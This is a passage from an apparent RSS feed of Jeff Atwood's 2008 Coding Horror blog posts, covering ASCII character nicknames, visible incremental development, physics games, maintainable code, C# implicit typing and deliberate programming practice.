<td style="font-size: xx-large;" valign="top">
<b>*</b>
</td>
<td valign="top">
<b>asterisk<br>
</b>star<br>
splat</td>
<td valign="top">
<table style="width: 100%">
<tr>
<td valign="top" width="40%">
wildcard<br>
gear<br>
dingle<br>
mult<br>
spider</td>
<td valign="top">
aster<br>
times<br>
twinkle<br>
<a href="http://catb.org/jargon/html/G/glob.html">glob</a><br>
<a href="http://catb.org/jargon/html/N/Nathan-Hale.html">Nathan Hale</a>
</td>
</tr>
</table>
</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
<b>+</b>
</td>
<td valign="top">
<b>plus</b><br>
add</td>
<td valign="top">
cross<br>
intersection</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
<b>,</b>
</td>
<td valign="top">
<b>comma</b>
</td>
<td valign="top">
cedilla<br>
tail</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
-</td>
<td valign="top">
<b>dash</b><br>
hyphen<br>
minus</td>
<td valign="top">
worm<br>
option<br>
dak<br>
bithorpe</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
<b>.</b>
</td>
<td valign="top">
<b>period<br>
</b>dot<br>
point<br>
decimal point</td>
<td valign="top">
radix point<br>
full stop<br>
spot</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
<b>/</b>
</td>
<td valign="top">
<b>slash</b><br>
stroke<br>
slant<br>
forward slash</td>
<td valign="top">
diagonal<br>
solidus<br>
over<br>
slak<br>
virgule<br>
slat</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
<b>\</b>
</td>
<td valign="top">
<table style="width: 100%">
<tr>
<td valign="top" width="40%">
<b>backslash<br>
</b>hack<br>
whack<br>
escape<br>
reverse slash</td>
<td valign="top">
slosh<br>
backslant<br>
backwhack</td>
</tr>
</table>
</td>
<td valign="top">
bash<br>
reverse slant<br>
reversed virgule<br>
backslat</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
<b>:</b>
</td>
<td valign="top">
<b>colon</b>
</td>
<td valign="top">
dots<br>
two-spot</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
<b>;</b>
</td>
<td valign="top">
<b>semicolon</b><br>
semi</td>
<td valign="top">
weenie<br>
hybrid<br>
pit-thwong</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
<b>=</b>
</td>
<td valign="top">
<b>equals<br>
</b>gets<br>
takes</td>
<td valign="top">
quadrathorpe<br>
half-mesh</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
<b>?</b>
</td>
<td valign="top">
<b>question mark<br>
</b>query<br>
<a href="http://catb.org/jargon/html/Q/ques.html">ques</a>
</td>
<td valign="top">
<table style="width: 100%">
<tr>
<td valign="top" width="40%">
quiz<br>
whatmark<br>
what<br>
wildchar</td>
<td valign="top">
huh<br>
hook<br>
buttonhook<br>
hunchback</td>
</tr>
</table>
</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
<b>@</b>
</td>
<td valign="top">
<b>at sign<br>
</b>at<br>
strudel</td>
<td valign="top">
<table style="width: 100%">
<tr>
<td valign="top" width="40%">
each<br>
vortex<br>
whorl<br>
whirlpool<br>
cyclone</td>
<td valign="top">
snail<br>
ape<br>
cat<br>
rose<br>
cabbage<br>
commercial at</td>
</tr>
</table>
</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
<b>^</b>
</td>
<td valign="top">
<b>circumflex<br>
</b>caret<b><br>
</b>hat<br>
control<br>
uparrow<br>
</td>
<td valign="top">
xor sign<br>
chevron<br>
shark (or shark-fin)<br>
to the<br>
fang<br>
pointer</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
<b>_</b>
</td>
<td valign="top">
<b>underline</b><br>
underscore<br>
underbar<br>
under</td>
<td valign="top">
score<br>
backarrow<br>
skid<br>
flatworm</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
<b>`</b>
</td>
<td valign="top">
<b>grave accent</b><br>
backquote<br>
left quote<br>
left single quote<br>
open quote<br>
grave</td>
<td valign="top">
<table style="width: 100%">
<tr>
<td valign="top" width="40%">
backprime<br>
backspark<br>
unapostrophe<br>
birk<br>
blugle</td>
<td valign="top">
back tick<br>
back glitch<br>
push<br>
opening single quote<br>
quasiquote</td>
</tr>
</table>
</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
<b>|</b>
</td>
<td valign="top">
<b>bar</b><br>
or<br>
or-bar<br>
v-bar<br>
pipe<br>
vertical bar</td>
<td valign="top">
vertical line<br>
gozinta<br>
thru<br>
pipesinta<br>
spike</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
<b>~</b>
</td>
<td valign="top">
<b>tilde</b><br>
squiggle<br>
<a href="http://catb.org/jargon/html/T/twiddle.html">twiddle</a><br>
not</td>
<td valign="top">
approx<br>
wiggle<br>
swung dash<br>
enyay<br>
sqiggle (sic)</td>
</tr>
</table>
<p>
If you're curious about the derivation of some of the odder names here, there are an extensive set of footnotes (and even <i>more</i> possible pronunciations) at <a href="http://ascii-table.com/pronunciation-guide.php">the ascii-table.com pronunciation guide</a>.
</p>
<p>
So the next time a programmer walks up to you and says, "oh, it's easy! Just type wax bang at hash buck grapes circumflex and splat wane", you'll know what they mean.
</p>
<p>
Maybe.
</p>
<p>
<!--kg-card-end: markdown-->
            </p> ]]></content>
<pubDate>2008-06-12T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/ascii-pronunciation-rules-for-programmers/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Don't Go Dark ]]></title>
<link>https://blog.codinghorror.com/dont-go-dark/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Ben Collins-Sussman on <a href="http://blog.red-bean.com/sussman/?p=96">programmer insecurity</a>:
</p>
<p>
</p>
<blockquote>
What do you do when somebody shows up to an open source project with a gigantic new feature that took months to write? Who has the time to review thousands of lines of code? What if there was a bad design decision made early in the process -- does it even make sense to point it out? Dropping code-bombs on communities is rarely good for the project: the team is either forced to reject it outright, or accept it and deal with a giant opaque blob that is hard to understand, change, or maintain. It moves the project decidedly in one direction without much discussion or consensus.
<p>
And yet over and over, I'm <a href="http://blog.red-bean.com/sussman/?p=96">gathering stories</a> that point to the fact that programmers <i>do not want to write code out in the open</i>. Programmers don't want their peers to see mistakes or failures. They want to work privately, in a cave, then spring "perfect" code on their community, as if no mistakes had ever been made.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I don't think it's hubris so much as fear of embarrassment. Rather than think of programming as an inherently social activity, most coders seem to treat it as an arena for personal heroics, and will do anything to protect that myth. They're fine with sharing code, as long as they present themselves as infallible, it seems. Maybe it's just human nature.
</p>
</blockquote>
<p>
Ben's talking about open source development, but this anti-pattern exists in commercial software development, too. The very same phenomenon is documented in Jim McCarthy's 1995 book <a href="http://www.amazon.com/dp/1556158238/?tag=codihorr-20">Dynamics of Software Development</a>. It's presented as Rule #30: <b>Don't go dark</b>.
</p>
<p>
</p>
<blockquote>
You have to manage the granularity of development tasks in such a way that you emerge with visible deliverables over short intervals. In our group, we argue back and forth over how big the intervals should be: five days, ten days, three weeks? <b>In our world, three weeks is going dark.</b>
<p>
I don't know what's appropriate for your world, but we want team members to have contracts with the other parts of the team so that they surface pretty often with visible components. When somebody surfaces and the deliverable isn't done, we know right away. We know that this week we slipped one day. That's worth knowing, much better than getting to the end of the project and observing, "Oh, we slipped six months!" At that point it's too late to even bother counting up how much you've slipped.
</p>
</blockquote>
<p>
Rule #30 is directly followed by a related rule, Rule #31: <b>Beware of a guy in a room.</b>
</p>
<p>
</p>
<blockquote>
Specialist developers who lock themselves away in a room, who go dark for long stretches, are anathema to shipping great software on time. No matter how brilliant a developer might be, don't give the developer a significant assignment unless he or she understands and buys into the type of development program you intend to run. The brilliant developer must be capable of performing on a team, making his work visible in modest increments and subjecting it to scrutiny as it matures. Some people find this intolerable, and although there is a role for people of this disposition in the software world, it is not as a part of a team devoted to shipping great software on time.
</blockquote>
<p>
This is easier to deal with in the workplace, because you typically have some kind of (theoretically) rational project management in place, and everyone works under the same umbrella. <b>It's effectively impossible to go dark if you're practicing any form of agile software development.</b> For example, Ron Jeffries borrowed this concept from Jim McCarthy's book and <a href="http://www.xprogramming.com/Practices/PracDark.html">codified it into extreme programming lore</a>. Tasks are always sliced up so they fit into a single iteration, and you never let them spill over into multiple iterations. You'll always have <i>something</i> to show at the end of each iteration. You can't go dark without quitting the project or, perhaps, your job.
</p>
<p>
An open source project is a very different animal. It's a motley collection of widely distributed, loosely coupled volunteers. There's no project manager breathing down your neck, urging you to break your work into short, shareable increments. <b>The risk of going dark is severe.</b> The burden of proof falls on the individual developers, not only to make their work on the project visible in modest increments,  but also to get over their code insecurity and share their in-progress code with other people working on the project. How do you expect your fellow coders to take you seriously if you aren't regularly showing them code? It's the only form of currency that matters on an open source project.
</p>
<p>
<b>Don't go dark. Don't be that guy in the room.</b> Hiding your code until it's "done" may feel safer, but it isn't. Sharing your ongoing code with your coworkers is scary, much less the world -- but it also results in feedback and communication that will improve your code and draw you closer to the project you're working on. And isn't that why we all write code in the first place?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-14T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/dont-go-dark/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Physics Based Games ]]></title>
<link>https://blog.codinghorror.com/physics-based-games/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I've always been fascinated by physics-based gameplay. Even going back to the primeval days of classic arcade gaming, I found vector-based games, with their vastly simplified 2D approximations of physics and motion, more compelling than their raster brethren. I'm thinking of games like <a href="http://en.wikipedia.org/wiki/Asteroids_(computer_game)">Asteroids</a>, <a href="http://en.wikipedia.org/wiki/Battlezone_(1980_video_game)">Battlezone</a>, and <a href="http://en.wikipedia.org/wiki/Lunar_Lander_(arcade_game)">Lunar Lander</a>.
</p>
<p>
Accurately simulating the physics of the real world has been <a href="http://news.uchicago.edu/news.php?asset_id=1354">the domain of supercomputers</a> for decades. The <a href="http://gameplanets.blogspot.com/2007/06/physics-simulations.html">simulation of even "simple" physical phenomena like fire, smoke, and water</a> requires a staggering amount of math. Now that we almost have multicore supercomputers on every desktop, it's only natural that aspect of computing would trickle down to us.
</p>
<p>
This topic is particularly relevant in light of <a href="http://www.techreport.com/articles.x/14934/2">today's introduction of NVIDIA's newest video card, the GTX 280</a>, which contains <b>a whopping 1.4 <i>billion</i> transistors</b>. That's a lot. For context and scale, here's a shot of the 280 GPU next to a modern Intel dual-core CPU.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I've talked about this before in <a href="http://www.codinghorror.com/blog/archives/000732.html">CPU vs. GPU</a>, but it bears repeating: <b>some of the highest performing hardware in your PC lies on your video card</b>. At least for a certain <a href="http://www.tomshardware.co.uk/nvidia-gtx-280,review-30971-24.html">highly parallelizable set of tasks</a>.
</p>
<p>
</p>
<blockquote>
We were able to compress our test video (400 MB) in iPhone format (640*365) at maximum quality in 56.5 seconds on the 260 GTX and 49 seconds on the 280 GTX (15% faster). For comparison purposes, the iTunes H.264 encoder took eight minutes using the CPU (consuming more power overall but significantly less on peaks).
</blockquote>
<p>
While one of <a href="http://www.codinghorror.com/blog/archives/001110.html">the primary benefits of manycore CPUs is radically faster video encoding</a>, let's put this in context -- compared to the newest, speediest quad core CPU, you can encode video <b>ten times faster</b> using a modern video card GPU. It's my hope that <a href="http://www.nvidia.com/object/cuda_home.html">CUDA</a>, Microsoft's <a href="http://channel9.msdn.com/wiki/accelerator/homepage/">Accelerator</a>, and Apple's <a href="http://www.apple.com/pr/library/2008/06/09snowleopard.html">Grand Central</a>/<a href="http://en.wikipedia.org/wiki/OpenCL">OpenCL</a> will make this more accessible to a wide range of software developers.
</p>
<p>
All this physics horsepower, whether it's coming from yet another manycore x86 CPU, or a massively parallel GPU, is there for the taking. There are quite a few <a href="http://en.wikipedia.org/wiki/Physics_engine">physics engines</a> available to programmers:
</p>
<p>
</p>
<ul>
<li>
<a href="http://tryhavok.intel.com/">Havok</a>
</li>
<li>
<a href="http://www.newtondynamics.com/downloads.html">Newton</a>
</li>
<li>
<a href="http://www.ode.org/">Open Dynamics Engine</a>
</li>
<li>
<a href="http://www.cove.org/ape/index.htm">Actionscript Physics Engine</a>
</li>
<li>
<a href="http://www.codeplex.com/FarseerPhysics">Farseer Physics Engine</a>
</li>
<li>
<a href="http://developer.nvidia.com/object/physx.htm">NVIDIA PhysX</a>
</li>
<li>
<a href="http://bulletphysics.com/">Bullet Physics</a>
</li>
</ul>
<p>
There are no shortage of <a href="http://www.fun-motion.com/list-of-physics-games/">physics games</a> and sandboxes to play with this stuff, too. Here are a few of my favorites.
</p>
<p>
Perhaps the most archetypal physics based game is Chronic Logic's <a href="http://www.chroniclogic.com/index.htm?pontifex2.htm">Bridge Construction Set</a>, the original version of which dates way back to 1999. I'm showing a picture of their fancy NVIDIA branded version below, but it's hardly about the graphics. This is pure physics simulation at its most entertaining. Who knew civil engineering could be so much <i>fun?</i> Highly recommended.
</p>
<p>
<a href="http://www.chroniclogic.com/index.htm?bridgeit.htm"><img alt="image placeholder" >
</p>
<p>
Oh, and small hint: after playing this game, you will learn to love the power and beauty of the simple triangle. You'll also marvel at the longer bridges you manage to drive across without plunging into the watery abyss underneath.
</p>
<p>
I've professed my love for <a href="http://www.codinghorror.com/blog/archives/000255.html">The Incredible Machine and other Rube Goldberg devices before</a>. The physics based game <a href="http://www.armadillorun.com/">Armadillo Run</a> is a modern iteration of same. Get the armadillo from point A to point B using whatever gizmos and gadgets you find in your sandbox -- rendered in glorious 3D with a full-blown 2D physics engine in the background.
</p>
<p>
<a href="http://www.armadillorun.com/"><img alt="image placeholder" >
</p>
<p>
The latest physics based game to <a href="http://www.rockpapershotgun.com/?p=1416">generate a lot of buzz</a> is <a href="http://www.redlynxtrials.com/index.jsp">Trials 2: Second Edition</a>. I haven't had a chance to try it yet, but the <a href="http://www.youtube.com/watch?v=25DbdzrU8R4">gameplay movie</a> is extremely impressive. Like Armadillo run, the action is all on a 2D plane, but the physics are impeccable.
</p>
<p>
<a href="http://www.redlynxtrials.com/index.jsp"><img alt="image placeholder" >
</p>
<p>
I'm sure I've forgotten a few physics based games here; peruse <a href="http://www.fun-motion.com/list-of-physics-games/">this giant list of physics games</a> to see if your favorite is already included.
</p>
<p>
See, physics <i>can</i> be fun -- and <b>increasingly complex physics engines</b> are an outstanding way to harness the massive computational horsepower that lies dormant in most modern PCs.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-16T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/physics-based-games/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Coding For Violent Psychopaths ]]></title>
<link>https://blog.codinghorror.com/coding-for-violent-psychopaths/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Today's rumination is not for the weak of heart. It's from the venerable C2 Wiki page <a href="http://c2.com/cgi/wiki?CodeForTheMaintainer">Code For The Maintainer</a>:
</p>
<p>
</p>
<blockquote>
<b>Always code as if the person who ends up maintaining your code is a violent psychopath who knows where you live.</b>
<p>
<img alt="image placeholder" >
</p>
</blockquote>
<p>
Perhaps a little over the top, but maybe that shock to the system is what we need to get this important point across to our fellow developers.
</p>
<p>
If scare tactics don't work, hopefully you can develop a grudging respect for <a href="http://www.codinghorror.com/blog/archives/000610.html">the noble art of maintenance programming</a> over time. It may not be glamorous, but it's 99% of the coding work in this world.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-17T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/coding-for-violent-psychopaths/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Department of Declaration Redundancy Department ]]></title>
<link>https://blog.codinghorror.com/department-of-declaration-redundancy-department/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I sometimes (often, actually) regress a few years mentally and forget to take advantage of new features afforded by the tools I'm using. In this case, we're using the latest and greatest version of C#, which offers <a href="http://msdn.microsoft.com/en-us/library/bb308966.aspx#csharp3.0overview_topic2">implicitly typed local variables</a>. While <a href="http://blog.stackoverflow.com/2008/06/gravatars-identicons-and-you/">working on Stack Overflow</a>, I was absolutely thrilled to be able to refactor this code:
</p>
<p>
</p>
<pre>
StringBuilder sb = new StringBuilder(256);
UTF8Encoding e = new UTF8Encoding();
MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
</pre>
<p>
Into this:
</p>
<p>
</p>
<pre>
var sb = new StringBuilder(256);
var e = new UTF8Encoding();
var md5 = new MD5CryptoServiceProvider();
</pre>
<p>
It's not dynamic typing, per se; C# is still very much a statically typed language. It's more of a compiler trick, a baby step toward a world of <a href="http://lambda-the-ultimate.org/node/834">Static Typing Where Possible, and Dynamic Typing When Needed</a>.
</p>
<p>
This may be a cheap parlor compiler trick, but it's a welcome one. While writing C# code, I sometimes felt like I had entered the <b>Department of Redundancy Department</b>.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Sure, there are times when failing to explicitly declare the type of an object can <a href="http://www.25hoursaday.com/weblog/2008/05/21/C30ImplicitTypeDeclarationsToVarOrNotToVar.aspx">hurt the readability and maintainability of your code</a>. But having the option to implicitly declare type can be a huge quality of life improvement for everyday coding, too.
</p>
<p>
There's always a <a href="http://www.codinghorror.com/blog/archives/000396.html">tradeoff between verbosity and conciseness</a>, but I have an awfully hard time defending the unnecessarily verbose way objects were typically declared in C# and Java.
</p>
<p>
</p>
<pre>
BufferedReader br = new BufferedReader (new FileReader(name));
</pre>
<p>
Who came up with this stuff?
</p>
<p>
Is there <i>really</i> any doubt what type of the variable br is? Does it help anyone, ever, to require another <code>BufferedReader</code> on the front of that line? This has bothered me for years, but it was an itch I just couldn't scratch. Until now.
</p>
<p>
If that makes sense to you, why not infer more fundamental data types, too?
</p>
<p>
</p>
<pre>
var url = "http://tinyurl.com/5pfvvy";
var maxentries = 5;
var pi = 3.14159;
var n = new int[] {1, 2, 3};
</pre>
<p>
I use implicit variable typing whenever and wherever it makes my code more concise. Anything that <b>removes redundancy from our code</b> should be aggressively pursued -- up to and including switching languages.
</p>
<p>
You might even say implicit variable typing is a gateway drug to more dynamically typed languages. And that's a good thing.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-19T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/department-of-declaration-redundancy-department/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Ultimate Code Kata ]]></title>
<link>https://blog.codinghorror.com/the-ultimate-code-kata/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
As I was paging through Steve Yegge's <a href="http://steve.yegge.googlepages.com">voluminous</a> <a href="http://steve-yegge.blogspot.com/">body</a> of work recently, I was struck by a 2005 entry on <a href="http://steve.yegge.googlepages.com/practicing-programming">practicing programming</a>:
</p>
<p>
</p>
<blockquote>
<b>Contrary to what you might believe, merely doing your job every day doesn't qualify as real practice.</b> Going to meetings isn't practicing your people skills, and replying to mail isn't practicing your typing. You have to set aside some time once in a while and do focused practice in order to get better at something.
<p>
I know a lot of great engineers -- that's one of the best perks of working at Amazon -- and if you watch them closely, you'll see that they practice constantly. As good as they are, they still practice. They have all sorts of ways of doing it, and this essay will cover a few of them.
</p>
<p>
The great engineers I know are as good as they are <i>because</i> they practice all the time. People in great physical shape only get that way by working out regularly, and they need to keep it up, or they get out of shape. The same goes for programming and engineering.
</p>
</blockquote>
<p>
It's an important distinction. I may drive to work every day, but I'm far from a professional driver. Similarly, programming every day may not be enough to make you a professional programmer. So what <i>can</i> turn someone into a professional driver or programmer? What do you do to practice?
</p>
<p>
The answer lies in the Scientific American article <a href="http://www.sciam.com/article.cfm?id=the-expert-mind&amp;print=true">The Expert Mind</a>:
</p>
<p>
</p>
<blockquote>
Ericsson argues that <b>what matters is not experience per se but "effortful study," which entails continually tackling challenges that lie just beyond one's competence.</b> That is why it is possible for enthusiasts to spend tens of thousands of hours playing chess or golf or a musical instrument without ever advancing beyond the amateur level and why a properly trained student can overtake them in a relatively short time. It is interesting to note that time spent playing chess, even in tournaments, appears to contribute less than such study to a player's progress; the main training value of such games is to point up weaknesses for future study.
</blockquote>
<p>
Effortful study means constantly tackling problems at the very edge of your ability. Stuff you may have a high probability of failing at. Unless you're <a href="http://www.codinghorror.com/blog/archives/000300.html">failing some of the time</a>, you're probably not growing professionally. You have to seek out those challenges and push yourself beyond your comfort limit.
</p>
<p>
Those challenges can sometimes be found on the job, but they don't have to be. Separating the <i>practicing</i> from the <i>profession</i> is often referred to as <a href="http://www.codekata.com/">code kata</a>.
</p>
<p>
<a href="http://en.wikipedia.org/wiki/Kata_(martial_arts)"><img alt="image placeholder" >
</p>
<p>
The concept of kata, a series of choreographed practice movements, is <a href="http://en.wikipedia.org/wiki/Kata_(martial_arts)">borrowed from the martial arts</a>.
</p>
<p>
If you're looking for some examples of code kata -- ways to practice effortful study and hone your programming skills -- <a href="http://steve.yegge.googlepages.com/practicing-programming">Steve's article</a> has some excellent starting points. He calls them <b>practice drills</b>:
</p>
<p>
</p>
<ol>
<li>Write your resume. List all your relevant skills, then note the ones that will still be needed in 100 years. Give yourself a 1-10 rating in each skill.
<p>
</p>
</li>
<li>Make a list of programmers who you admire. Try to include some you work with, since you'll be borrowing them for some drills. Make one or two notes about things they seem to do well -- things you wish you were better at.
<p>
</p>
</li>
<li>Go to Wikipedia's <a href="http://en.wikipedia.org/">entry for computer science</a>, scroll down to the "Prominent pioneers in computer science" section, pick a person from the list, and read about them. Follow any links from there that you think look interesting.
<p>
</p>
</li>
<li>Read through someone else's code for 20 minutes. For this drill, alternate between reading great code and reading bad code; they're both instructive. If you're not sure of the difference, ask a programmer you respect to show you examples of each. Show the code you read to someone else, and see what they think of it.
<p>
</p>
</li>
<li>Make a list of your 10 favorite programming tools: the ones you feel you use the most, the ones you almost couldn't live without. Spend an hour reading the docs for one of the tools in your list, chosen at random. In that hour, try learn some new feature of the tool that you weren't aware of, or figure out some new way to use the tool.
<p>
</p>
</li>
<li>Pick something you're good at that has nothing to do with programming. Think about how the professionals or great masters of that discipline do their practice. What can you learn from them that you can apply to programming?
<p>
</p>
</li>
<li>Get a pile of resumes and a group of reviewers together in a room for an hour. Make sure each resume is looked at by at least 3 reviewers, who write their initials and a score (1-3). Discuss any resumes that had a wide discrepancy in scoring.
<p>
</p>
</li>
<li>Listen in on a <a href="http://www.codinghorror.com/blog/archives/001042.html">technical phone screen</a>. Write up your feedback afterwards, cast your vote, and then talk about the screen with the screener to see if you both reached the same conclusions.
<p>
</p>
</li>
<li>Conduct a technical interview with a candidate who's an expert in some field you don't know much about. Ask them to explain it to you from the ground up, assuming no prior knowledge of that field. Try hard to follow what they're saying, and ask questions as necessary.
<p>
</p>
</li>
<li>Get yourself invited to someone else's technical interview. Listen and learn. Try to solve the interview questions in your head while the candidate works on them.
<p>
</p>
</li>
<li>Find a buddy for trading practice questions. Ask each other programming questions, alternating weeks. Spend 10 or 15 minutes working on the problem, and 10 or 15 minutes discussing it (finished or not.)
<p>
</p>
</li>
<li>When you hear any interview coding question that you haven't solved yourself, go back to your desk and mail the question to yourself as a reminder. Solve it sometime that week, using your favorite programming language.
</li>
</ol>
<p>
What I like about Steve's list is that it's somewhat holistic. When some developers think "practice" they can't get beyond code puzzles. But to me, programming is <a href="http://www.codinghorror.com/blog/archives/000541.html">more about people than code</a>, so there's a limit to how much you can grow from solving every obscure programming coding interview problem on the planet.
</p>
<p>
I also like Peter Norvig's general recommendations for effortful study outlined in <a href="http://www.norvig.com/21-days.html">Teach Yourself Programming in Ten Years</a>.
</p>
<p>
</p>
<ol>
<li>Talk to other programmers. Read other programs. This is more important than any book or training course.
<p>
</p>
</li>
<li>Program! The best kind of learning is learning by doing.
<p>
</p>
</li>
<li>Take programming classes at the college or graduate level.
<p>
</p>
</li>
<li>Seek out and work on projects with teams of programmers. Find out what it means to be the best programmer on a project -- <i>and</i> the worst.
<p>
</p>
</li>
<li>Work on projects <i>after</i> other programmers. Learn how to maintain code you didn't write. Learn how to write code so other people can effectively maintain it.
<p>
</p>
</li>
<li>Learn different programming languages. Pick languages that have alternate worldviews and programming models unlike what you're used to.
<p>
</p>
</li>
<li>Understand how the hardware affects what you do. Know how long it takes your computer to execute an instruction, fetch a word from memory (with and without a cache miss), transfer data over ethernet (or the internet), read consecutive words from disk, and seek to a new location on disk.
</li>
</ol>
<p>
You can also glean some further inspiration from <a href="http://www.codekata.com/">Pragmatic Dave's 21 Code Katas</a>, or maybe you'd like to <a href="http://www.codingdojo.org/">join a Coding Dojo</a> in your area.
</p>
<p>
I don't have a long list of effortful study advice like Steve and Peter and Dave do. I'm far too impatient for that. In fact, there are only two movements in my book of code kata:
</p>
<p>
</p>
<ol>
<li>
<b>Write a blog.</b> I started this blog in early 2004 as a form of effortful study. From those humble beginnings it has turned into the most significant thing I've ever done in my professional life. So <a href="http://steve.yegge.googlepages.com/you-should-write-blogs">you should write blogs</a>, too. The people who can write and communicate effectively are, all too often, the only people who get heard. They get to set the terms of the debate.
<p>
</p>
</li>
<li>
<b>Actively participate in a notable open source project or three</b>. All the fancy blah blah blah talk is great, but are you <a href="http://www.codinghorror.com/blog/archives/001017.html">a talker or a doer</a>? This is critically important, because <a href="http://gettingreal.37signals.com/ch08_Actions_Not_Words.php">you will be judged by your actions, not your words</a>. Try to leave a trail of public, concrete, useful things in your wake that you can point to and say: I helped build that.
</li>
</ol>
<p>
When you can write brilliant code <i>and</i> brilliant prose explaining that code to the world -- well, I figure that's <b>the ultimate code kata</b>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-22T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-ultimate-code-kata/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Revisiting the XML Angle Bracket Tax ]]></title>
<link>https://blog.codinghorror.com/revisiting-the-xml-angle-bracket-tax/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Occasionally I'll write about things that I find sort of mildly, vaguely thought provoking, and somehow that writing turns out to be <em>ragingly controversial</em> once posted here. Case in point, <a href="http://www.codinghorror.com/blog/archives/001114.html">XML: The Angle Bracket Tax</a>. I'm still encountering people online <strong>who almost literally <em>hate my guts</em> because I wrote that post</strong>. You'd think I kicked their dog, or made inappropriate romantic overtures toward their significant other.</p>
<p>Well, first of all, we are talking about XML the markup language, <a href="http://www.codinghorror.com/blog/archives/000699.html">not XML the religion</a>, right?</p>
<p>I hope so. I try not to get emotionally involved with the tools and technologies that I use, if I can avoid it. This doesn't mean I can't be enthusiastic or critical of those tools and technologies, but I'm not <em>married</em> to the stuff either way. Who needs all the emotional baggage?</p>
<p>Obviously I failed to communicate this before. I talked about this a little bit <a href="http://blog.stackoverflow.com/2008/05/podcast-5/">on Stack Overflow podcast #5</a> with Joel, where I tried to amplify and explain my position a little better.</p>
<blockquote>I wasn't trying to present it as "Oh, XML is bad, let's all switch to this new markup language that all the cool guys are using". What I was trying to say is <strong>why don't we think about what we're doing?</strong> That's the general theme of a lot of the stuff in my blog. Can we just stop programming for a minute to think about what we're doing and not make a blind choice based on "Well this is what my tool does, so that's what I have to do"?
<p>I think obviously there's pros and cons to each.  I'm not saying that one is the right solution all the time.  But I think, ironically, that <em>is</em> what is happening with XML.  I think people are saying "It's always the right answer, because it can store anything, right? And all the stuff I use uses it, so it must be the right choice for everything." That bothers me a little.  Maybe I'm just contrarian. Maybe I'm an iconoclast and I want to try different things and see different things, but I think <strong>actually understanding the alternatives helps you understand XML better, a little bit, too.</strong></p>
<p>And I hope people reading my blog would not get the idea that it's about a knee-jerk reaction one way or the other. It's about understanding the tradeoffs and applying those tradeoffs to your particular situation.  I think that is the absolute art of programming. It's understanding what you <em>could</em> do, and which one of those things fits your situation best. Versus what so many programmers do, which is "I've learned to use a hammer, and I'm gonna hammer everything." Ultimately, to me, it's about self-awareness.</p>
</blockquote>
<p>By the way, I'd like to thank everyone who pitches in to make those <a href="http://stackoverflow.fogbugz.com/default.asp?W4">Stack Overflow podcast transcriptions possible</a>. It is because of your generously donated time that I am able to quote that audio here.</p>
<p>I don't post stuff to push people's buttons, I post it because I want programmers to <strong>think</strong> about their tools, their technologies, their methods.</p>
<p><img alt="image placeholder" >
<p>If what I post here seems unnecessarily confrontational sometimes, a far smarter person than myself <a href="http://www.skrenta.com/2007/08/crypto_vs_the_working_coder.html">said it better than I can</a>:</p>
<blockquote><strong>I blog to help others and also to learn. As it turns out both are aided by getting folks to actually read the stuff. Please pardon the necessary devices.</strong></blockquote>
<p>Please do pardon the necessary devices; I find that I often learn best through <a href="http://www.codinghorror.com/blog/archives/000630.html">the smackdown learning model</a>. That works for me. Maybe it doesn't work for you, and that's OK. There are millions of websites to choose from.</p>
